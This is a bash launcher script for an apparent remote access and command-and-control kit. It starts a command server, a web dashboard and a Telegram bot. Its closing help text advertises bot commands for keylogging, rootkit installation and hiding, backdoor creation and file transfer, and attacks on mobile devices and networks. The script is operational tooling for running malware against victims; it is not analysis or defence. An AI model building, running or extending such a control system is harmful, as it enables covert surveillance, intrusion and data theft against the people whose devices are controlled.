#!/bin/bash

# ========================================
# Simple System Startup Script
# ========================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${BLUE}================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}================================${NC}"
}

# Create directories
mkdir -p logs
mkdir -p data

print_header "Starting Advanced Remote Control System"

# Start command server
print_status "Starting command server..."
cd remote-control-system/command-server
pyenv exec python3 server.py > ../../logs/command-server.log 2>&1 &
COMMAND_SERVER_PID=$!
echo $COMMAND_SERVER_PID > ../../.command-server.pid
cd ../..
print_status "Command server started (PID: $COMMAND_SERVER_PID)"

# Wait for command server to start
sleep 3

# Start web interface
print_status "Starting web interface..."
python3 web_dashboard.py > logs/web-interface.log 2>&1 &
WEB_INTERFACE_PID=$!
echo $WEB_INTERFACE_PID > .web-interface.pid
print_status "Web interface started (PID: $WEB_INTERFACE_PID)"

# Wait for web interface to start
sleep 2

# Start telegram bot
print_status "Starting telegram bot..."
cd remote-control-system/telegram-bot
pyenv exec python3 bot.py > ../../logs/telegram-bot.log 2>&1 &
TELEGRAM_BOT_PID=$!
echo $TELEGRAM_BOT_PID > ../../.telegram-bot.pid
cd ../..
print_status "Telegram bot started (PID: $TELEGRAM_BOT_PID)"

print_header "System Started Successfully!"
echo "🎯 All components are running"
echo "📊 Check logs in the 'logs' directory"
echo ""
echo "🔗 Access URLs:"
echo "  🌐 Web Dashboard: http://localhost:8081"
echo "  🔧 Command Server: http://localhost:10001"
echo "  🤖 Telegram Bot: Running in background"
echo ""
echo "📋 Available Commands:"
echo "  🔑 /keylogger start|stop|data"
echo "  🔧 /rootkit install|escalate|hide"
echo "  🚪 /backdoor create|execute|transfer"
echo "  💻 /system info|control|monitor"
echo "  📱 /mobile attack|control|extract"
echo "  🌐 /network scan|attack|monitor"
echo ""
echo "🛑 To stop: ./simple_stop.sh"

# Keep script running
wait